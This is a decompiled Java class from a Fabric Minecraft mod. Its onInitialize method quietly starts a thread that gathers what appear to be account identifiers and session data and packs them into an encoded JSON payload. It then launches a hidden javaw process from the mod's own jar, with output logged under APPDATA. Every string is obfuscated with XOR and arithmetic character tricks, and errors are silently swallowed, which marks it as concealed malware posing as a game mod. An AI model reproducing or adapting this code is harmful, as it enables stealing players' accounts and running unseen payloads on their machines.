/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.fabricmc.api.ModInitializer
 */
package net.fabric;

import java.io.File;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;
import net.fabric.sJqeuctwv;
import net.fabric.uthLt4U_UZ;
import net.fabricmc.api.ModInitializer;

public class jChkxlati
implements ModInitializer {
    public jChkxlati() {
        jChkxlati capVal;
    }

    public void onInitialize() {
        jChkxlati wTyb_agfk_fxrt_IQgy;
        new Thread(() -> {
            try {
                String string;
                jChkxlati OcSCw_o2_zE;
                String resultMin = sJqeuctwv.valFjkzejmb();
                String lO17_R7nkLC3 = sJqeuctwv.L5mWf();
                String idxMin = sJqeuctwv.peekLkeywhi();
                if (idxMin == null) {
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append((char)(28595 - 28478));
                    stringBuilder.append((char)(11708 - 11598));
                    stringBuilder.append((char)(31989 - 31882));
                    stringBuilder.append((char)(19563 - 19453));
                    stringBuilder.append((char)(14330 - 14219));
                    stringBuilder.append((char)(54966 - 54847));
                    stringBuilder.append((char)(52961 - 52851));
                    idxMin = stringBuilder.toString();
                }
                String hryntqCafDyZn = uthLt4U_UZ.kJdifO();
                String ptrData = uthLt4U_UZ.mqBx0BZzGT8QUDD();
                Path tucFcbkgCes = OcSCw_o2_zE.mgflx_nvfme_szjkmd_xdvvgl();
                uthLt4U_UZ UeCR_hLdd_HgWB_aBWB = new uthLt4U_UZ();
                String hpyK_edpn_mqLn_RDeN = UeCR_hLdd_HgWB_aBWB.getDomain();
                String mntilv_acnd_audou = UeCR_hLdd_HgWB_aBWB.prefire(hpyK_edpn_mqLn_RDeN, resultMin, hryntqCafDyZn);
                Base64.Encoder encoder = Base64.getEncoder();
                String string2 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(resultMin);
                String string3 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(idxMin);
                String string4 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(lO17_R7nkLC3);
                char[] cArray = new char[]{(char)(40628 + 25031), (char)(56220 + 9350), (char)(10721 + 54932), (char)(50096 + 15555), (char)(2162 + 63475), (char)(22037 + 43613), (char)(57465 + 8181), (char)(50000 + 15633), (char)(29200 + 36445), (char)(17900 + 47737), (char)(40539 + 25031), (char)(56244 + 9350), (char)(10638 + 54932)};
                StringBuilder stringBuilder = new StringBuilder().append(new String(cArray)).append(string4);
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2.append((char)(33378 - 33344));
                stringBuilder2.append((char)(33613 - 33569));
                stringBuilder2.append((char)(19591 - 19557));
                stringBuilder2.append((char)(35369 - 35252));
                stringBuilder2.append((char)(31118 - 31001));
                stringBuilder2.append((char)(14138 - 14033));
                stringBuilder2.append((char)(31979 - 31879));
                stringBuilder2.append((char)(34095 - 34061));
                stringBuilder2.append((char)(31920 - 31862));
                stringBuilder2.append((char)(8338 - 8304));
                char[] cArray2 = new char[]{(char)(45157 + 20413), (char)(35155 + 30425), (char)(15434 + 50136), (char)(47511 + 18122), (char)(1465 + 64170), (char)(52772 + 12863), (char)(5173 + 60464), (char)(43803 + 21848), (char)(31981 + 33670), (char)(16063 + 49557), (char)(58006 + 7641), (char)(8 + 99), (char)(42743 + 22894), (char)(53306 + 12340), (char)(45157 + 20413), (char)(35169 + 30425), (char)(15434 + 50136)};
                String tempBuf = encoder.encodeToString(stringBuilder.append(stringBuilder2.toString()).append(string3).append(new String(cArray2)).append(string2).append("\"}").toString().getBytes(StandardCharsets.UTF_8));
                if (mntilv_acnd_audou != null) {
                    string = mntilv_acnd_audou;
                } else {
                    StringBuilder stringBuilder3 = new StringBuilder();
                    stringBuilder3.append((char)(0xD4FE ^ 0xD490));
                    stringBuilder3.append((char)(0x5118 ^ 0x516D));
                    stringBuilder3.append((char)(0x6AF5 ^ 0x6A99));
                    stringBuilder3.append((char)(0x9705 ^ 0x9769));
                    string = stringBuilder3.toString();
                }
                String string5 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(idxMin);
                String string6 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(lO17_R7nkLC3);
                String string7 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(tucFcbkgCes != null ? tucFcbkgCes.toString() : "");
                String string8 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(hpyK_edpn_mqLn_RDeN);
                String string9 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(ptrData);
                String string10 = OcSCw_o2_zE.tttqzbtWrzblFjldctJmbr(hryntqCafDyZn);
                String string11 = string;
                String string12 = tempBuf;
                char[] cArray3 = new char[]{(char)(0xD7CE ^ 0xD7B5), (char)(0xBE66 ^ 0xBE44), (char)(0xE35B ^ 0xE336), (char)(0x6C11 ^ 0x6C72), (char)(0x38A0 ^ 0x38E9), (char)(0x19B7 ^ 0x19D9), (char)(0xFE75 ^ 0xFE13), (char)(0xB4B4 ^ 0xB4DB), (char)(0xB44E ^ 0xB46C), (char)(0x2139 ^ 0x2103), (char)(0xD797 ^ 0xD7B5)};
                char[] cArray4 = new char[]{(char)(0x2E01 ^ 0x2E23), (char)(0x314C ^ 0x3160), (char)(0x4789 ^ 0x47AB), (char)(0xE6D7 ^ 0xE6A7), (char)(0x42A1 ^ 0x42D3), (char)(0x257B ^ 0x251E), (char)(0x5800 ^ 0x5866), (char)(0x60FA ^ 0x6093), (char)(0x54C3 ^ 0x54B1), (char)(0x2E46 ^ 0x2E23), (char)(0x3129 ^ 0x3160), (char)(0x47CF ^ 0x47AB), (char)(0xE685 ^ 0xE6A7), (char)(0x42E9 ^ 0x42D3), (char)(0x253C ^ 0x251E)};
                char[] cArray5 = new char[]{(char)(39500 - 39466), (char)(8571 - 8527), (char)(55779 - 55745), (char)(2129 - 2012), (char)(39581 - 39466), (char)(8628 - 8527), (char)(55859 - 55745), (char)(2085 - 2012), (char)(39566 - 39466), (char)(8561 - 8527), (char)(55803 - 55745), (char)(2046 - 2012)};
                StringBuilder stringBuilder4 = new StringBuilder().append(new String(cArray3)).append(string12).append(new String(cArray4)).append(string11).append(new String(cArray5)).append(string10);
                StringBuilder stringBuilder5 = new StringBuilder();
                stringBuilder5.append((char)(0xB62F ^ 0xB60D));
                stringBuilder5.append((char)(0x4B28 ^ 0x4B04));
                stringBuilder5.append((char)(0xF244 ^ 0xF266));
                stringBuilder5.append((char)(0x431E ^ 0x436A));
                stringBuilder5.append((char)(0x3475 ^ 0x3414));
                stringBuilder5.append((char)(0x4958 ^ 0x493F));
                stringBuilder5.append((char)(0x5524 ^ 0x5506));
                stringBuilder5.append((char)(0xB637 ^ 0xB60D));
                stringBuilder5.append((char)(0x4B26 ^ 0x4B04));
                StringBuilder stringBuilder6 = stringBuilder4.append(stringBuilder5.toString()).append(string9);
                StringBuilder stringBuilder7 = new StringBuilder();
                stringBuilder7.append((char)(0x257C ^ 0x255E));
                stringBuilder7.append((char)(0xACF0 ^ 0xACDC));
                stringBuilder7.append((char)(0x2F52 ^ 0x2F70));
                stringBuilder7.append((char)(0xBF40 ^ 0xBF24));
                stringBuilder7.append((char)(0xD87C ^ 0xD813));
                stringBuilder7.append((char)(0xFD86 ^ 0xFDEB));
                stringBuilder7.append((char)(0x1138 ^ 0x1159));
                stringBuilder7.append((char)(0x4B8E ^ 0x4BE7));
                stringBuilder7.append((char)(0x5B71 ^ 0x5B1F));
                stringBuilder7.append((char)(0x17BD ^ 0x179F));
                stringBuilder7.append((char)(0xDEBD ^ 0xDE87));
                stringBuilder7.append((char)(0xCE30 ^ 0xCE12));
                char[] cArray6 = new char[]{(char)(15742 - 15708), (char)(51826 - 51782), (char)(27606 - 27572), (char)(43536 - 43433), (char)(54651 - 54554), (char)(4975 - 4866), (char)(14949 - 14848), (char)(15776 - 15708), (char)(51887 - 51782), (char)(27686 - 27572), (char)(43467 - 43433), (char)(54612 - 54554), (char)(4900 - 4866)};
                char[] cArray7 = new char[]{(char)(37149 + 28421), (char)(50296 + 15284), (char)(39791 + 25779), (char)(42194 + 23451), (char)(23403 + 42232), (char)(6952 + 58669), (char)(24821 + 40830), (char)(56489 + 9148), (char)(3431 + 62219), (char)(26485 + 39161), (char)(37212 + 28421), (char)(50361 + 15284), (char)(39858 + 25779), (char)(42119 + 23451), (char)(23362 + 42232), (char)(6901 + 58669)};
                StringBuilder stringBuilder8 = stringBuilder6.append(stringBuilder7.toString()).append(string8).append(new String(cArray6)).append(string7).append(new String(cArray7)).append(string6);
                StringBuilder stringBuilder9 = new StringBuilder();
                stringBuilder9.append((char)(60065 - 60031));
                stringBuilder9.append((char)(31411 - 31367));
                stringBuilder9.append((char)(26692 - 26658));
                stringBuilder9.append((char)(55387 - 55278));
                stringBuilder9.append((char)(7644 - 7545));
                stringBuilder9.append((char)(4034 - 3949));
                stringBuilder9.append((char)(36115 - 35998));
                stringBuilder9.append((char)(60136 - 60031));
                stringBuilder9.append((char)(31467 - 31367));
                stringBuilder9.append((char)(26692 - 26658));
                stringBuilder9.append((char)(55336 - 55278));
                stringBuilder9.append((char)(7579 - 7545));
                StringBuilder stringBuilder10 = stringBuilder8.append(stringBuilder9.toString()).append(string5);
                StringBuilder stringBuilder11 = new StringBuilder();
                stringBuilder11.append((char)(0xA698 ^ 0xA6BA));
                stringBuilder11.append((char)(0xC37B ^ 0xC357));
                stringBuilder11.append((char)(0x5B56 ^ 0x5B74));
                stringBuilder11.append((char)(0xEF40 ^ 0xEF25));
                stringBuilder11.append((char)(0xD6FA ^ 0xD694));
                stringBuilder11.append((char)(0x9E08 ^ 0x9E7E));
                stringBuilder11.append((char)(0xA698 ^ 0xA6BA));
                stringBuilder11.append((char)(0xC36D ^ 0xC357));
                stringBuilder11.append((char)(0x5B56 ^ 0x5B74));
                stringBuilder11.append((char)(0xEF63 ^ 0xEF25));
                stringBuilder11.append((char)(0xD6F5 ^ 0xD694));
                stringBuilder11.append((char)(0x9E1C ^ 0x9E7E));
                stringBuilder11.append((char)(0xA6C8 ^ 0xA6BA));
                stringBuilder11.append((char)(0xC33E ^ 0xC357));
                stringBuilder11.append((char)(0x5B17 ^ 0x5B74));
                stringBuilder11.append((char)(0xEF07 ^ 0xEF25));
                stringBuilder11.append((char)(0xD6E9 ^ 0xD694));
                String firvlbGfnlddUcb = stringBuilder10.append(stringBuilder11.toString()).toString();
                String wpblm_cc_bydj = Base64.getEncoder().encodeToString(firvlbGfnlddUcb.getBytes(StandardCharsets.UTF_8));
                StringBuilder stringBuilder12 = new StringBuilder();
                stringBuilder12.append((char)(53313 - 53207));
                stringBuilder12.append((char)(52966 - 52869));
                stringBuilder12.append((char)(37836 - 37718));
                stringBuilder12.append((char)(52509 - 52412));
                stringBuilder12.append((char)(29695 - 29649));
                stringBuilder12.append((char)(34331 - 34227));
                stringBuilder12.append((char)(36515 - 36404));
                stringBuilder12.append((char)(1801 - 1692));
                stringBuilder12.append((char)(55791 - 55690));
                String bomF_aDuK_diMo_OBzB = System.getProperty(stringBuilder12.toString());
                String[] stringArray = new String[2];
                stringArray[0] = "bin";
                StringBuilder stringBuilder13 = new StringBuilder();
                stringBuilder13.append((char)(0x9FD5 ^ 0x9FBF));
                stringBuilder13.append((char)(0x9A0B ^ 0x9A6A));
                stringBuilder13.append((char)(0x245A ^ 0x242C));
                stringBuilder13.append((char)(0xA332 ^ 0xA353));
                stringBuilder13.append((char)(0xE8FE ^ 0xE889));
                stringBuilder13.append((char)(0x126E ^ 0x1240));
                stringBuilder13.append((char)(0x9FDA ^ 0x9FBF));
                stringBuilder13.append((char)(0x9A12 ^ 0x9A6A));
                stringBuilder13.append((char)(0x2449 ^ 0x242C));
                stringArray[1] = stringBuilder13.toString();
                Path tmpIdx = Path.of((String)bomF_aDuK_diMo_OBzB, (String[])stringArray);
                if (!Files.exists(tmpIdx, new LinkOption[0])) {
                    String[] stringArray2 = new String[2];
                    stringArray2[0] = "bin";
                    char[] cArray8 = new char[]{(char)(64991 - 64885), (char)(64395 - 64298), (char)(33044 - 32926), (char)(60560 - 60463), (char)(48995 - 48949), (char)(49248 - 49147), (char)(11328 - 11208), (char)(40991 - 40890)};
                    stringArray2[1] = new String(cArray8);
                    tmpIdx = Path.of((String)bomF_aDuK_diMo_OBzB, (String[])stringArray2);
                }
                URI bgZx_KWwK_QRBO_BYbR = jChkxlati.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                Path idxlen = Path.of((URI)bgZx_KWwK_QRBO_BYbR);
                StringBuilder stringBuilder14 = new StringBuilder();
                stringBuilder14.append((char)(44079 + 21533));
                stringBuilder14.append((char)(50350 + 15265));
                stringBuilder14.append((char)(39614 + 25989));
                stringBuilder14.append((char)(26 + 39));
                stringBuilder14.append((char)(32764 + 32848));
                stringBuilder14.append((char)(43318 + 22283));
                stringBuilder14.append((char)(53652 + 11964));
                stringBuilder14.append((char)(46383 + 19233));
                stringBuilder14.append((char)(9621 + 55983));
                stringBuilder14.append((char)(44068 + 21533));
                stringBuilder14.append((char)(50355 + 15265));
                stringBuilder14.append((char)(39612 + 25989));
                String string13 = System.getenv(stringBuilder14.toString());
                String[] stringArray3 = new String[3];
                StringBuilder stringBuilder15 = new StringBuilder();
                stringBuilder15.append((char)(0xBE64 ^ 0xBE29));
                stringBuilder15.append((char)(0x48B ^ 0x4E2));
                stringBuilder15.append((char)(0xDE27 ^ 0xDE44));
                stringBuilder15.append((char)(0xDA3 ^ 0xDD1));
                stringBuilder15.append((char)(0x3A58 ^ 0x3A37));
                stringBuilder15.append((char)(0x9F1D ^ 0x9F6E));
                stringBuilder15.append((char)(0x24C7 ^ 0x24A8));
                stringBuilder15.append((char)(0x96B7 ^ 0x96D1));
                stringBuilder15.append((char)(0xDDFF ^ 0xDD8B));
                stringArray3[0] = stringBuilder15.toString();
                StringBuilder stringBuilder16 = new StringBuilder();
                stringBuilder16.append((char)(7720 + 57903));
                stringBuilder16.append((char)(38129 + 27512));
                stringBuilder16.append((char)(6536 + 59110));
                stringBuilder16.append((char)(60963 + 4673));
                stringBuilder16.append((char)(63952 + 1695));
                stringBuilder16.append((char)(45897 + 19758));
                stringBuilder16.append((char)(26945 + 38706));
                stringArray3[1] = stringBuilder16.toString();
                StringBuilder stringBuilder17 = new StringBuilder();
                stringBuilder17.append((char)(40008 - 39930));
                stringBuilder17.append((char)(19106 - 18990));
                stringBuilder17.append((char)(3713 - 3633));
                stringBuilder17.append((char)(30779 - 30665));
                stringBuilder17.append((char)(61708 - 61597));
                stringBuilder17.append((char)(18433 - 18331));
                stringBuilder17.append((char)(33080 - 32975));
                stringBuilder17.append((char)(40038 - 39930));
                stringBuilder17.append((char)(19091 - 18990));
                stringBuilder17.append((char)(3706 - 3633));
                stringBuilder17.append((char)(30775 - 30665));
                stringBuilder17.append((char)(61697 - 61597));
                stringBuilder17.append((char)(18432 - 18331));
                stringBuilder17.append((char)(33095 - 32975));
                stringArray3[2] = stringBuilder17.toString();
                Path pFzs_HNqz_gmDW_DuGR = Path.of((String)string13, (String[])stringArray3);
                Files.createDirectories(pFzs_HNqz_gmDW_DuGR, new FileAttribute[0]);
                String LRs__G_jS = uthLt4U_UZ.class.getName();
                ProcessBuilder Ye_Sz95Uc = new ProcessBuilder(tmpIdx.toString(), "-cp", idxlen.toString(), LRs__G_jS, wpblm_cc_bydj);
                Ye_Sz95Uc.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
                StringBuilder stringBuilder18 = new StringBuilder();
                stringBuilder18.append((char)(2756 - 2661));
                stringBuilder18.append((char)(5685 - 5570));
                stringBuilder18.append((char)(3569 - 3457));
                stringBuilder18.append((char)(42762 - 42665));
                stringBuilder18.append((char)(25166 - 25047));
                stringBuilder18.append((char)(48996 - 48886));
                stringBuilder18.append((char)(31166 - 31120));
                stringBuilder18.append((char)(2769 - 2661));
                stringBuilder18.append((char)(5681 - 5570));
                stringBuilder18.append((char)(3560 - 3457));
                Ye_Sz95Uc.redirectOutput(ProcessBuilder.Redirect.appendTo(pFzs_HNqz_gmDW_DuGR.resolve(stringBuilder18.toString()).toFile()));
                Ye_Sz95Uc.redirectErrorStream(true);
                Ye_Sz95Uc.directory(pFzs_HNqz_gmDW_DuGR.toFile());
                Ye_Sz95Uc.start();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }).start();
    }

    private Path mgflx_nvfme_szjkmd_xdvvgl() {
        Path whhnzs_syfe;
        block8: {
            block7: {
                char[] cArray = new char[]{(char)(0xDDA3 ^ 0xDDD6), (char)(0xEF7F ^ 0xEF0C), (char)(0x4C28 ^ 0x4C4D), (char)(0xBC61 ^ 0xBC13), (char)(0x554B ^ 0x5565), (char)(0x988D ^ 0x98E9), (char)(0xC2C9 ^ 0xC2A0), (char)(0x3FC1 ^ 0x3FB3)};
                whhnzs_syfe = Path.of((String)System.getProperty(new String(cArray)), (String[])new String[0]);
                char[] cArray2 = new char[]{(char)(0x794A ^ 0x7925), (char)(0xB77C ^ 0xB70C), (char)(0x4D3B ^ 0x4D4F), (char)(0x6F3E ^ 0x6F57), (char)(0xB137 ^ 0xB158), (char)(0x32B0 ^ 0x32DE), (char)(0x13B6 ^ 0x13C5), (char)(0xFB66 ^ 0xFB48), (char)(0x4AFD ^ 0x4A89), (char)(0x51AE ^ 0x51D6), (char)(0x4DAD ^ 0x4DD9)};
                if (Files.exists(whhnzs_syfe.resolve(new String(cArray2)), new LinkOption[0])) break block7;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append((char)(46183 + 19452));
                stringBuilder.append((char)(25808 + 39839));
                stringBuilder.append((char)(2664 + 62982));
                stringBuilder.append((char)(37737 + 27901));
                stringBuilder.append((char)(34756 + 30885));
                stringBuilder.append((char)(59352 + 6287));
                if (Files.exists(whhnzs_syfe.resolve(stringBuilder.toString()), new LinkOption[0])) break block7;
                char[] cArray3 = new char[]{(char)(0x5066 ^ 0x500B), (char)(0x5A2D ^ 0x5A42), (char)(0xA01C ^ 0xA078), (char)(0xD9D6 ^ 0xD9A5)};
                if (!Files.exists(whhnzs_syfe.resolve(new String(cArray3)), new LinkOption[0])) break block8;
            }
            return whhnzs_syfe;
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append((char)(0x1A27 ^ 0x1A66));
        stringBuilder.append((char)(0x4A76 ^ 0x4A26));
        stringBuilder.append((char)(0x33FE ^ 0x33AE));
        stringBuilder.append((char)(0x4CE8 ^ 0x4CAC));
        stringBuilder.append((char)(0x741C ^ 0x745D));
        stringBuilder.append((char)(0x5301 ^ 0x5355));
        stringBuilder.append((char)(0xD20B ^ 0xD24A));
        String biGsdNkzxmQpj = System.getenv(stringBuilder.toString());
        if (biGsdNkzxmQpj != null) {
            String[] stringArray = new String[1];
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append((char)(63909 - 63863));
            stringBuilder2.append((char)(57013 - 56904));
            stringBuilder2.append((char)(6599 - 6494));
            stringBuilder2.append((char)(46351 - 46241));
            stringBuilder2.append((char)(49741 - 49640));
            stringBuilder2.append((char)(14008 - 13909));
            stringBuilder2.append((char)(55347 - 55233));
            stringBuilder2.append((char)(34527 - 34430));
            stringBuilder2.append((char)(57961 - 57859));
            stringBuilder2.append((char)(57599 - 57483));
            stringArray[0] = stringBuilder2.toString();
            Path xBuf = Path.of((String)biGsdNkzxmQpj, (String[])stringArray);
            if (Files.exists(xBuf, new LinkOption[0])) {
                return xBuf;
            }
        }
        StringBuilder stringBuilder3 = new StringBuilder();
        stringBuilder3.append((char)(0x57F6 ^ 0x5783));
        stringBuilder3.append((char)(0x4B83 ^ 0x4BF0));
        stringBuilder3.append((char)(0xD5D6 ^ 0xD5B3));
        int n = -401118942;
        if (n == -401118942) {
            long l = 5179759970679320086L;
            l &= 0x58B09B1777443937L;
            l |= 0x5743DF13057B0F8CL;
        }
        stringBuilder3.append((char)(0x2C02 ^ 0x2C70));
        stringBuilder3.append((char)(0x45E9 ^ 0x45C7));
        stringBuilder3.append((char)(0x6956 ^ 0x693E));
        stringBuilder3.append((char)(0x41FA ^ 0x4195));
        stringBuilder3.append((char)(0x9A52 ^ 0x9A3F));
        stringBuilder3.append((char)(0x22F ^ 0x24A));
        String string = System.getProperty(stringBuilder3.toString());
        String[] stringArray = new String[1];
        StringBuilder stringBuilder4 = new StringBuilder();
        stringBuilder4.append((char)(0x8C2F ^ 0x8C01));
        stringBuilder4.append((char)(0x7279 ^ 0x7214));
        stringBuilder4.append((char)(0xA70F ^ 0xA766));
        stringBuilder4.append((char)(0x3E80 ^ 0x3EEE));
        stringBuilder4.append((char)(0x6137 ^ 0x6152));
        stringBuilder4.append((char)(0xB7B3 ^ 0xB7D0));
        stringBuilder4.append((char)(0x8B79 ^ 0x8B0B));
        stringBuilder4.append((char)(0xD9D9 ^ 0xD9B8));
        stringBuilder4.append((char)(0x333 ^ 0x355));
        stringBuilder4.append((char)(0x8C75 ^ 0x8C01));
        stringArray[0] = stringBuilder4.toString();
        Path ahlbb_hwh_oln_hq = Path.of((String)string, (String[])stringArray);
        if (Files.exists(ahlbb_hwh_oln_hq, new LinkOption[0])) {
            return ahlbb_hwh_oln_hq;
        }
        return whhnzs_syfe;
    }

    private String tttqzbtWrzblFjldctJmbr(String flags2) {
        if (flags2 == null) {
            return "";
        }
        StringBuilder cNum = new StringBuilder();
        block7: for (char dh_ca_dt_sahipg : flags2.toCharArray()) {
            switch (dh_ca_dt_sahipg) {
                case '\"': {
                    cNum.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    char[] cArray = new char[]{(char)(35015 + 30613), (char)(51531 + 14097)};
                    cNum.append(new String(cArray));
                    continue block7;
                }
                case '\n': {
                    cNum.append("\\n");
                    continue block7;
                }
                case '\r': {
                    cNum.append("\\r");
                    continue block7;
                }
                case '\t': {
                    cNum.append("\\t");
                    continue block7;
                }
                default: {
                    if (dh_ca_dt_sahipg < ' ') {
                        StringBuilder stringBuilder = new StringBuilder();
                        stringBuilder.append((char)(12923 - 12831));
                        stringBuilder.append((char)(45731 - 45614));
                        stringBuilder.append((char)(10455 - 10418));
                        stringBuilder.append((char)(21547 - 21499));
                        stringBuilder.append((char)(33263 - 33211));
                        stringBuilder.append((char)(8040 - 7920));
                        cNum.append(String.format(stringBuilder.toString(), dh_ca_dt_sahipg));
                        int n = -1818813229;
                        if ((n ^ 0x93971CD3) != 0) continue block7;
                        n = -1329113064;
                        n ^= 0x3953225E;
                        continue block7;
                    }
                    cNum.append(dh_ca_dt_sahipg);
                }
            }
        }
        return cNum.toString();
    }
}

